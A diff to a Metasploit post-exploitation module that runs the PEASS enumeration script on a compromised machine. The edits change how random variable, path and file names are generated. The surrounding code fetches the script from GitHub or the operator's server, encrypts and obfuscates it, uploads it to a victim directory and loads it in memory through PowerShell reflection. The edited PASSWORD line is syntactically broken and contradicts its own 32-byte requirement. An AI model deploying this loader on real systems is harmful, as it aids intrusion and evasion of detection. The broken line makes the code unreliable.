@@ -72,14 +72,14 @@ class MetasploitModule < Msf::Post
       [
         OptString.new('WINPEASS', [true, 'Which PEASS script to use. Use True for WinPeass and false for LinPEASS', true]),
         OptString.new('CUSTOM_URL', [false, 'URL to download the PEASS script from (if not using the default one). Accepts http(s) or absolute path. Overrides the WINPEASS variable', 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe']),
-        OptString.new('PASSWORD', [false, 'Password to encrypt and obfuscate the script (randomly generated). The length must be 32B. If no password is set, only base64 will be used.', rand(36**32).to_s(36)]),
+        OptString.new('PASSWORD', [false, 'Password to encrypt and obfuscate the script (randomly generated). The length must be 32B. If no password is set, only base64 will be used.', Rex::Text.rand_text_alphanumeric(7),
         OptString.new('TEMP_DIR', [false, 'Path to upload the obfuscated PEASS script inside the compromised machine. By default "C:\Windows\System32\spool\drivers\color" is used in Windows and "/tmp" in Unix.', '']),
         OptString.new('PARAMETERS', [false, 'Parameters to pass to the script', nil]),
         OptString.new('TIMEOUT', [false, 'Timeout of the execution of the PEASS script (15min by default)', 15 * 60]),
         OptString.new('SRVHOST', [false, 'Set your metasploit instance IP if you want to download the PEASS script from here via http(s) instead of uploading it.', '']),
         OptString.new('SRVPORT', [false, 'Port to download the PEASS script from using http(s) (only used if SRVHOST)', 443]),
         OptString.new('SSL', [false, 'Indicate if you want to communicate with https (only used if SRVHOST)', true]),
-        OptString.new('URIPATH', [false, 'URI path to download the script from there (only used if SRVHOST)', '/' + rand(36**4).to_s(36) + '.txt'])
+        OptString.new('URIPATH', [false, 'URI path to download the script from there (only used if SRVHOST)', '/' + Rex::Text.rand_text_alphanumeric(4) + '.txt'])
       ]
     )
 
@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    ps_var1 = rand(36**5).to_s(36) # Winpeas PS needed variable
+    ps_var1 = Rex::Text.rand_text_alphanumeric(5) # Winpeas PS needed variable
 
     # Load PEASS script in memory
     peass_script = load_peass
@@ -123,9 +123,9 @@ class MetasploitModule < Msf::Post
         iv_b64 = aes_enc_peass_ret['iv_b64']
         load_winpeas = get_ps_aes_decr
 
-        ps_var2 = rand(36**6).to_s(36)
+        ps_var2 = Rex::Text.rand_text_alphanumeric(6)
         load_winpeas += "$#{ps_var2} = DecryptStringFromBytesAes \"#{key_b64}\" \"#{iv_b64}\" $#{ps_var1};"
-        load_winpeas += "$#{rand(36**7).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var2}));"
+        load_winpeas += "$#{Rex::Text.rand_text_alphanumeric(7)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var2}));"
       end
 
     else
@@ -141,7 +141,7 @@ class MetasploitModule < Msf::Post
 
       # Needed code to decode it in Unix and Windows
       decode_linpeass_cmd = 'base64 -d'
-      load_winpeas = "$#{rand(36**6).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var1}));"
+      load_winpeas = "$#{Rex::Text.rand_text_alphanumeric(6)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var1}));"
 
     end
 
@@ -153,7 +153,7 @@ class MetasploitModule < Msf::Post
 
     if datastore['SRVHOST'] == ''
       # Upload file to victim
-      temp_peass_name = rand(36**5).to_s(36)
+      temp_peass_name = Rex::Text.rand_text_alphanumeric(5)
       if datastore['TEMP_DIR'] != ''
         temp_path = datastore['TEMP_DIR']
         if temp_path[0] == '/'
